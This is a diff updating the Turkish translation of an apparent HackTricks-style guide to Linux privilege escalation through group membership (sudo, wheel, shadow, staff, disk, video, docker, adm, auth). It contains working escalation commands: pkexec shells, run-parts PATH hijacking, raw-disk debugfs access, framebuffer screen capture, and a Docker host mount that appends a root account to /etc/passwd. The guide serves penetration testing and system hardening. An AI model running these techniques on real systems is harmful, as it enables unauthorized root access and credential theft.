@@ -14,9 +14,9 @@
 # Allow members of group admin to execute any command
 %admin 	ALL=(ALL:ALL) ALL
 ```
-Bu, **sudo veya admin grubuna ait herhangi bir kullanıcının sudo olarak her şeyi çalıştırabileceği** anlamına gelir.
+Bu, **sudo veya admin grubuna dahil olan herhangi bir kullanıcının sudo olarak her şeyi çalıştırabileceği** anlamına gelir.
 
-Durum buysa, **root olmak için yalnızca şunu çalıştırabilirsiniz**:
+Durum buysa, **root olmak için şunu çalıştırabilirsiniz**:
 ```
 sudo su
 ```
@@ -26,8 +26,8 @@ Tüm suid binary'lerini bulun ve **Pkexec** binary'sinin olup olmadığını kon
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-Binary **pkexec'in bir SUID binary** olduğunu ve **sudo** veya **admin** grubuna dahil olduğunuzu fark ederseniz, `pkexec` kullanarak muhtemelen binary'leri sudo olarak çalıştırabilirsiniz.\
-Bunun nedeni, bu grupların genellikle **polkit policy** içindeki gruplar olmasıdır. Bu policy, temelde hangi grupların `pkexec` kullanabileceğini belirler. Şununla kontrol edin:
+Eğer **pkexec bir SUID binary** ise ve **sudo** veya **admin** grubuna dahilseniz, `pkexec` kullanarak binary'leri sudo olarak çalıştırabilirsiniz.\
+Bunun nedeni, genellikle bu grupların **polkit policy** içindeki gruplar olmasıdır. Bu policy, temel olarak hangi grupların `pkexec` kullanabileceğini belirler. Şununla kontrol edin:
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
@@ -37,13 +37,13 @@ Burada **pkexec** çalıştırmasına izin verilen grupları bulabilirsiniz ve b
 ```bash
 pkexec "/bin/sh" #You will be prompted for your user password
 ```
-**pkexec** çalıştırmayı denediğinizde bu **hatayı** alırsanız:
+**pkexec**'i çalıştırmayı denerseniz ve şu **hatayı** alırsanız:
 ```bash
 polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-**Bu, yetkilere sahip olmadığınız için değil, GUI olmadan bağlı olmadığınız için olur**. Bu sorun için burada bir geçici çözüm bulunmaktadır: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). **2 farklı ssh oturumuna** ihtiyacınız var:
+**Bu, yetkiniz olmadığı için değil, GUI olmadan bağlı olmadığınız için**. Bu sorun için burada bir geçici çözüm bulunmaktadır: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). **2 farklı ssh oturumuna** ihtiyacınız var:<sup>[[1]](#references)</sup>
 ```bash:session1
 echo $$ #Step1: Get current PID
 pkexec "/bin/bash" #Step 3, execute pkexec
@@ -62,29 +62,29 @@ pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 ```
 Bu, **wheel grubuna ait herhangi bir kullanıcının sudo olarak her şeyi çalıştırabileceği** anlamına gelir.
 
-Durum buysa, **root olmak için şunu çalıştırmanız yeterlidir**:
+Durum buysa, **root olmak için şu komutu çalıştırmanız yeterlidir**:
 ```
 sudo su
 ```
-## shadow Grubu
+## Shadow Grubu
 
-**shadow grubundaki** kullanıcılar **/etc/shadow** dosyasını **okuyabilir**:
+**shadow** grubundaki kullanıcılar **/etc/shadow** dosyasını **okuyabilir**:
 ```
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
-Bu nedenle dosyayı okuyun ve **bazı hash'leri crack etmeyi** deneyin.
+Yani dosyayı okuyun ve bazı **hash'leri crack etmeyi** deneyin.
 
-Hash'leri incelerken hızlı kilit durumu ayrıntısı:
-- `!` veya `*` içeren girdiler genellikle password login için etkileşimli değildir.
+Hash'leri triage ederken hızlı kilit durumu ayrıntısı:
+- `!` veya `*` içeren girdiler genellikle password login'leri için etkileşimli değildir.
 - `!hash` genellikle bir password ayarlanıp ardından kilitlendiği anlamına gelir.
 - `*` genellikle hiçbir geçerli password hash'inin ayarlanmadığı anlamına gelir.
 Bu, direct login engellenmiş olsa bile account classification için kullanışlıdır.
 
-## Staff Group
+## Staff Grubu
 
-**staff**: Kullanıcıların root privileges gerektirmeden sistemde (`/usr/local`) yerel değişiklikler yapmasına olanak tanır (herhangi bir kullanıcının PATH variable'ında `/usr/local/bin` içindeki executable'ların bulunduğunu ve aynı ada sahip `/bin` ve `/usr/bin` içindeki executable'ları "override" edebileceklerini unutmayın). Monitoring/security ile daha ilgili olan "adm" group'u ile karşılaştırın. [\[source\]](https://wiki.debian.org/SystemGroups)
+**staff**: Kullanıcıların root privileges gerektirmeden sistemde (`/usr/local`) yerel değişiklikler yapmasına olanak tanır (`/usr/local/bin` içindeki executable'ların herhangi bir kullanıcının PATH variable'ında bulunduğunu ve aynı ada sahip `/bin` ve `/usr/bin` içindeki executable'ları "override" edebileceklerini unutmayın). Daha çok monitoring/security ile ilişkili olan "adm" grubu ile karşılaştırın. [\[source\]](https://wiki.debian.org/SystemGroups)<sup>[[2]](#references)</sup>
 
-Debian distributions'ta `$PATH` variable, privileged user olsanız da olmasanız da `/usr/local/` dizininin en yüksek priority ile çalıştırılacağını gösterir.
+Debian distributions'ta `$PATH` variable, privileged bir user olsanız da olmasanız da `/usr/local/`'ın en yüksek öncelikle çalıştırılacağını gösterir.
 ```bash
 $ echo $PATH
 /usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
@@ -92,9 +92,9 @@ $ echo $PATH
 # echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
-`/usr/local` içindeki bazı programları hijack edebilirsek root yetkisini kolayca elde edebiliriz.
+`/usr/local` içindeki bazı programları hijack edebilirsek kolayca root olabiliriz.
 
-`run-parts` programını hijack etmek root yetkisini kolayca elde etmenin bir yoludur; çünkü çoğu program `run-parts` çalıştırır (crontab ve SSH ile giriş sırasında olduğu gibi).
+`run-parts` programını hijack etmek root olmak için kolay bir yöntemdir, çünkü çoğu program `run-parts` çalıştırır (crontab, SSH ile giriş yapıldığında olduğu gibi).
 ```bash
 $ cat /etc/crontab | grep run-parts
 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
@@ -134,9 +134,9 @@ $ ls -la /bin/bash
 # 0x5 root it
 $ /bin/bash -p
 ```
-## Disk Group
+## Disk Grubu
 
-Bu ayrıcalık, makinenin içindeki tüm verilere erişebileceğiniz için neredeyse **root access** ile eşdeğerdir.
+Bu ayrıcalık, makinenin içindeki tüm verilere erişebileceğiniz için **root erişimine** neredeyse eşdeğerdir.
 
 Files:`/dev/sd[a-z][1-9]`
 ```bash
@@ -152,42 +152,42 @@ debugfs kullanarak **dosya yazabileceğinizi** de unutmayın. Örneğin `/tmp/as
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
-Ancak, **root** tarafından sahip olunan dosyalara (örneğin `/etc/shadow` veya `/etc/passwd`) **write** etmeye çalışırsanız "**Permission denied**" hatası alırsınız.
+Ancak, **root tarafından sahip olunan dosyalara** (örneğin `/etc/shadow` veya `/etc/passwd`) **yazmayı** denerseniz "**Permission denied**" hatası alırsınız.
 
 ## Video Grubu
 
-`w` komutunu kullanarak **sistemde kimin oturum açtığını** bulabilirsiniz ve aşağıdakine benzer bir çıktı görüntülenir:
+`w` komutunu kullanarak **sistemde kimin oturum açmış olduğunu** bulabilirsiniz ve aşağıdakine benzer bir çıktı görüntülenir:
 ```bash
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
 moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
-**tty1**, **yossi** kullanıcısının makinedeki bir terminale **fiziksel olarak giriş yaptığını** belirtir.
+**tty1**, kullanıcının **yossi makinedeki bir terminale fiziksel olarak giriş yaptığını** belirtir.
 
-**video group**, ekran çıktısını görüntüleme erişimine sahiptir. Temel olarak ekranları gözlemleyebilirsiniz. Bunu yapmak için ekrandaki **mevcut görüntüyü** ham veri olarak almanız ve ekranın kullandığı çözünürlüğü öğrenmeniz gerekir. Ekran verileri `/dev/fb0` konumuna kaydedilebilir; bu ekranın çözünürlüğünü `/sys/class/graphics/fb0/virtual_size` konumunda bulabilirsiniz.
+**video grubu**, ekran çıktısını görüntüleme erişimine sahiptir. Temel olarak ekranları gözlemleyebilirsiniz. Bunu yapmak için **ekrandaki mevcut görüntüyü** ham veri olarak almanız ve ekranın kullandığı çözünürlüğü öğrenmeniz gerekir. Ekran verileri `/dev/fb0` konumuna kaydedilebilir ve bu ekranın çözünürlüğünü `/sys/class/graphics/fb0/virtual_size` konumunda bulabilirsiniz.
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
-**raw image** dosyasını **açmak** için **GIMP** kullanabilir, **`screen.raw`** dosyasını seçebilir ve dosya türü olarak **Raw image data** seçeneğini belirleyebilirsiniz:
+**raw image** dosyasını **açmak** için **GIMP** kullanabilir, **`screen.raw`** dosyasını seçebilir ve dosya türü olarak **Raw image data** seçebilirsiniz:
 
-![Disk Group - Video Group: Raw image dosyasını açmak için GIMP kullanabilir, screen.raw dosyasını seçebilir ve dosya türü olarak Raw image data seçeneğini belirleyebilirsiniz](<../../../images/image (463).png>)
+![Disk Group - Video Group: Raw image dosyasını açmak için GIMP kullanabilir, screen.raw dosyasını seçebilir ve dosya türü olarak Raw image data seçebilirsiniz](<../../../images/image (463).png>)
 
-Ardından **Width** ve **Height** değerlerini ekranda kullanılan değerlerle değiştirin ve farklı **Image Types** seçeneklerini kontrol edin (ekranı en iyi göstereni seçin):
+Ardından **Width** ve **Height** değerlerini ekranda kullanılan değerlerle değiştirin ve farklı **Image Types** seçeneklerini kontrol edin (ekranı daha iyi göstereni seçin):
 
-![Disk Group - Video Group: Ardından Width ve Height değerlerini ekranda kullanılan değerlerle değiştirin ve farklı Image Types seçeneklerini kontrol edin (ekranı en iyi göstereni seçin)](<../../../images/image (317).png>)
+![Disk Group - Video Group: Ardından Width ve Height değerlerini ekranda kullanılan değerlerle değiştirin ve farklı Image Types seçeneklerini kontrol edin (ekranı daha iyi göstereni seçin)](<../../../images/image (317).png>)
 
-## Root Grubu
+## Root Group
 
-Varsayılan olarak **root grubunun üyelerinin**, ayrıcalıkları yükseltmek için kullanılabilecek bazı **service** yapılandırma dosyalarını, bazı **library** dosyalarını veya **diğer ilginç şeyleri** değiştirme erişimine sahip olabileceği görülüyor...
+Varsayılan olarak **root group üyelerinin** bazı **service** yapılandırma dosyalarını, bazı **libraries** dosyalarını veya **privilege escalation** için kullanılabilecek **diğer ilginç şeyleri** değiştirme erişimine sahip olabileceği görülüyor...
 
-**root üyelerinin değiştirebileceği dosyaları kontrol edin**:
+**root üyelerinin hangi dosyaları değiştirebildiğini kontrol edin**:
 ```bash
 find / -group root -perm -g=w 2>/dev/null
 ```
-## Docker Group
+## Docker Grubu
 
-**Ana makinenin root filesystem’ını bir instance’ın volume’una mount edebilirsiniz**, böylece instance başladığında bu volume’a otomatik olarak bir `chroot` yükler. Bu, makine üzerinde root yetkisi elde etmenizi sağlar.
+**Host makinenin root filesystem'ını bir instance'ın volume'una mount edebilirsiniz**; böylece instance başlatıldığında bu volume içine hemen bir `chroot` yükler. Bu, makine üzerinde etkili bir şekilde root yetkisi sağlar.
 ```bash
 docker image #Get images from the docker service
 
@@ -199,50 +199,51 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/pa
 #Ifyou just want filesystem and network access you can startthe following container:
 docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
 ```
-Son olarak, önceki önerilerden hiçbirini beğenmiyorsanız veya herhangi bir nedenle çalışmıyorsa (docker api firewall?), burada açıklandığı üzere her zaman **privileged bir container çalıştırıp içinden escape etmeyi** deneyebilirsiniz:
-
+Son olarak, önceki önerilerden hiçbirini beğenmiyorsanız veya herhangi bir nedenle çalışmıyorlarsa (docker api firewall?), burada açıklandığı gibi her zaman **privileged bir container çalıştırıp içinden escape etmeyi** deneyebilirsiniz:
 
 {{#ref}}
 ../../containers-namespaces/container-security/
 {{#endref}}
 
-Docker socket üzerinde write permission'ınız varsa, [**docker socket'i abuse ederek nasıl privilege escalation yapılacağını anlatan bu postu**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)** okuyun.**
-
+Docker socket üzerinde yazma izinleriniz varsa, [**docker socket'i abuse ederek nasıl privilege escalation yapılacağını anlatan bu yazıyı okuyun**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**
 
 {{#ref}}
 https://github.com/KrustyHack/docker-privilege-escalation
 {{#endref}}
 
-
 {{#ref}}
 https://fosterelli.co/privilege-escalation-via-docker.html
 {{#endref}}
 
-## lxc/lxd Grubu
-
+## lxc/lxd Group
 
 {{#ref}}
 ./
 {{#endref}}
 
-## Adm Grubu
+## Adm Group
 
 Genellikle **`adm`** grubunun **üyeleri**, _/var/log/_ içinde bulunan **log** dosyalarını **okuma** izinlerine sahiptir.\
-Bu nedenle, bu gruptaki bir kullanıcıyı compromise ettiyseniz kesinlikle **loglara göz atmalısınız**.
+Bu nedenle, bu gruptaki bir user'ı compromise ettiyseniz kesinlikle **log'lara göz atmalısınız**.
 
-## Backup / Operator / lp / Mail Grupları
+## Backup / Operator / lp / Mail groups
 
-Bu gruplar, doğrudan root vektörlerinden ziyade genellikle **credential-discovery** vektörleridir:
+Bu gruplar genellikle doğrudan root vektörlerinden ziyade **credential-discovery** vektörleridir:
 - **backup**: config'ler, key'ler, DB dump'ları veya token'lar içeren arşivleri açığa çıkarabilir.
-- **operator**: hassas runtime verilerini leak edebilecek platforma özgü operasyonel erişim sağlayabilir.
-- **lp**: print queue/spool'ları belge içerikleri barındırabilir.
-- **mail**: mail spool'ları reset link'lerini, OTP'leri ve dahili credential'ları açığa çıkarabilir.
+- **operator**: hassas runtime verilerini leak edebilen, platforma özgü operasyonel erişim sağlayabilir.
+- **lp**: print queue/spool'ları doküman içerikleri barındırabilir.
+- **mail**: mail spool'ları reset link'lerini, OTP'leri ve internal credential'ları açığa çıkarabilir.
 
 Buradaki üyeliği yüksek değerli bir data exposure bulgusu olarak değerlendirin ve password/token reuse üzerinden pivot edin.
 
-## Auth Grubu
+## Auth group
 
-OpenBSD'de **auth** grubu, kullanılıyorlarsa genellikle _**/etc/skey**_ ve _**/var/db/yubikey**_ klasörlerine write edebilir.\
+OpenBSD içinde **auth** grubu, kullanılıyorlarsa genellikle _**/etc/skey**_ ve _**/var/db/yubikey**_ klasörlerine yazabilir.\
 Bu izinler, aşağıdaki exploit ile root'a **privilege escalation** yapmak için abuse edilebilir: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
+
+## Referanslar
+
+- [1] [pkexec/pkttyagent authentication without a GUI session (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
+- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)
 
 {{#include ../../../banners/hacktricks-training.md}}
